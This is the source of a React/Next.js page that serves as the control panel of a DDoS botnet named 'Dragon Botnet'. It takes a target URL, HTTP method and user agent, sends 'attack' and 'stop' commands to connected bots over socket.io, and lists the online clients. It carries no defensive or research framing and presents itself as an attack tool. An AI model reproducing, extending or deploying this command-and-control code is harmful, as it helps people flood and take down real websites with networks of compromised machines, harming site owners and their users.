import Head from 'next/head'
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import io from "socket.io-client";
import { useState, useRef, useEffect } from "react";

export default function Home() {
  const socket = useRef();
  const [options, setOptions] = useState({
    url: String,
    method: String,
    user_agent: String
  });
  const [disabled, setDisabled] = useState(false);
  const [unixbots, setUnixbots] = useState([]);

  const handleChange = (e) => {
    const { name, value } = e.target;

    setOptions((prev) => ({ ...prev, [name]: value }));
  }

  const handleClick = () => {
    if (disabled === true) {
      if (socket.current) {
        socket.current.emit("stop", "now");
      }

      setDisabled(false);
    } else {
      setDisabled(true);

      if (socket.current) {
        socket.current.emit("attack", options);
      }
    }
  }

  useEffect(() => {
    if (!socket.current) {
      socket.current = io();
    }

    if (socket.current) {
      socket.current.on("connectedBots", ({ bots }) => {
        setUnixbots(bots);
      });
    }
  }, []);

  /* https://irennegade-psychic-guacamole-gpwjr697447cxxr-3000.preview.app.github.dev/ */

  return (
    <div className={styles.container}>
      <div className={styles.header}>
        <h1 className={styles.gradient}>Dragon Botnet</h1>
        <h3>Powerfull Layer 7 DDoS Attacks</h3>
      </div>
      <div className={styles.body}>
        <div className={styles.form}>
          <h2 className={styles["form-gradient"]}>Attack Options</h2>
          <div className={styles.value}>
            <h3>Target URL</h3>
            <input value={options.url} placeholder="Some Url..." name="url" onChange={handleChange} />
          </div>
          <div className={styles.value}>
            <h3>HTTP Method</h3>
            <input value={options.method} placeholder="GET, POST" name="method" onChange={handleChange} />
          </div>
          <div className={styles.value}>
            <h3>User Agent</h3>
            <input value={options.user_agent} placeholder="Mozilla/5.0 (X11).." name="user_agent" onChange={handleChange} />
          </div>
          <button className={styles.button} onClick={handleClick} disabled={disabled}>Start</button>
          <button className={styles.button} onClick={handleClick}>Stop</button>
        </div>
        <div className={styles.form}>
          <h2 className={styles["form-gradient"]}>Online Clients</h2>
          <div className={styles.active}>
            {unixbots && unixbots.length > 0 ? (
              unixbots.map(bot => {
                return <h3>{bot}</h3>
              })
            ) : <h3>No clients connected</h3>}
          </div>
        </div>
      </div>
    </div>
  );
}
